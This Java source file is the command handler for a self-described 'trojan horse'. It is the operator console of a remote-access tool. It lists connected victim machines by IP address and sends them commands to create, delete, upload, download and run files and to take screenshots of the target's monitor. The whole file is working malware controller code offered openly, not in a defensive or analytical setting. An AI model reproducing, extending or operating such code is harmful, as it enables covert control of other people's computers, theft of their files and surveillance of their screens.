import java.io.File;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.util.Scanner;

/**
 * Created by pontu on 2018-02-19.
 */

/*
Class used to take care of all the commands from the trojan horse user.
Displays all the command options and is constantly waiting for a new command.
 */
public class CommandHandler extends Thread {
    private boolean alive = true;
    private boolean active = true;
    private Scanner keyboard = new Scanner(System.in);
    private TrojanHorse trojan;
    private int target = 0;
    CommandHandler(TrojanHorse th) {
        trojan = th;
        start();
    }

    /*
    Run method that is constantly waiting for a new command from user.
    if a command is received handleCommand() is called.
     */
    public void run() {
        while(alive) {
            while(active) {
                try{
                    Thread.sleep(100);
                    System.out.print("Command to send: ");
                    String command = keyboard.nextLine();
                    if(target != 0 || command.equals("select")) {
                        handleCommand(command);
                    }else{
                        System.out.println("Select a target with the \"select\" command and follow instructions.");
                    }
                }catch(Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    /*
    Method to handle the users command calls either command description to display the description
    of a command for the user or to issue the command so that it can be sent to the client
    for execution.
     */
    private void handleCommand(String commandString) {
        if(commandString.contains(" ")) {
            String command = commandString.substring(0, commandString.indexOf(" "));
            String commandInput = commandString.substring(commandString.indexOf(" ") + 1, commandString.length());
            if(command.equals("push")) {
                try {
                    String[] pathArray = commandInput.split(" ");
                    pushToTarget(pathArray[0], pathArray[1]);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }else if(command.equals("help")){
                commandDescription(commandInput);
            }else {
                issueCommand(commandString);
            }
        }else if(commandString.equals("select")) {
            selectTarget();
        }else if(commandString.equals("help")) {
            commandDescription("commands");
        }else{
            issueCommand(commandString);
        }
    }

    /*
    Method used to display the command descriptions for the user.
     */
    private void commandDescription(String command) {
        switch(command) {
            case "touch":
                System.out.println("Creates a text file with chosen name and content. touch + file name + file text. Example: touch ExampleFile hello this is the text.");
                break;
            case "mkdir":
                System.out.println("Creates a directory with chosen name. mkdir + directory name. Example: mkdir testFolder.");
                break;
            case "ls":
                System.out.println("Lists all the files and directories in the current directory. Example: ls.");
                break;
            case "cd":
                System.out.println("Changes the standing directory. cd + directory name. Example: cd C://.");
                break;
            case "rm":
                System.out.println("Removes specified file or directory. rm + file/folder name. Example: rm testfolder.");
                break;
            case "run":
                System.out.println("Runs the specified file on the targets system. run + filename. Example: run soundFile.wav.");
                break;
            case "push":
                System.out.println("Sends the specified file to the target. push + file name + new name. Example: push fileToPush newName.");
                break;
            case "get":
                System.out.println("Retrieves the specified file from the target. get + file name. Example: get exampleFile.");
                break;
            case "screen":
                System.out.println("Takes a screenshot of the targets monitor, retrieves it and displays it. Example: screen.");
                break;
            case "commands":
                System.out.println("For information about a command do \"help + command\".\nAvailable commands are:\ntouch - Create a text file.\nmkdir - Create a directory.\nls - List files and directories.\ncd - Change directory.\nrm - Remove file or directory.\nrun - Run a file.\npush - Transfers a file to target.\nget - Retrieves a file from target.\nscreen - Takes a screenshot and retrieves it from target.\n");
        }
    }

    /*
    Method used to select the target for the command if the Trojan Horse has multiple clients
    connected to it.
     */
    private void selectTarget(){
        for(int i = 0; i < trojan.getConnections().size(); i++) {
            Connection con = trojan.getConnections().get(i);
            System.out.println("ID " + (i + 1)+ ": " + con.getSocket().getInetAddress());
        }
        System.out.println("Select target by entering ID number: ");
        try {
            int inputValue = Integer.parseInt(keyboard.nextLine());
            if(inputValue <= trojan.getConnections().size() && inputValue > 0) {
                target = inputValue;
                System.out.println("New target is: " + target);
            }else{
                System.out.println("Incorrect target id. Please try again.");
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method used to push a file to the clients computer.
    uses input streams to first read the file and then an object output stream to send the file.
     */
    private void pushToTarget(String filePath, String clientPath) {
        ObjectOutputStream oos;

        File file = new File(filePath);
        if(file.exists()) {
            byte[] fileArray = new byte[(int) file.length()];
            try {
                FileInputStream fileInputStream = new FileInputStream(file);
                fileInputStream.read(fileArray);
                fileInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }

            try {
                Connection con = trojan.getConnections().get(target-1);
                oos = con.getOos();
                Storage objectToSend = new Storage("push" + " " + clientPath, fileArray);
                oos.writeObject(objectToSend);
                oos.flush();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }else{
            System.out.println("File does not exist. Can not send file!");
        }
    }

    /*
    Issue a normal text command by sending it to the client pc with a object output stream.
     */
    private void issueCommand(String command) {
        ObjectOutputStream oos;
        Connection con = trojan.getConnections().get(target-1);
        try {
            oos = con.getOos();
            Storage objectToSend = new Storage(command);
            oos.writeObject(objectToSend);
            oos.flush();
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method used to set the alive status of the thread.
     */
    public void setAlive(boolean a) {
        active = a;
        alive = a;
    }

    /*
    Method used to set the active status of the thread.
     */
    public void setActive(boolean a) {
        active = a;
    }
}
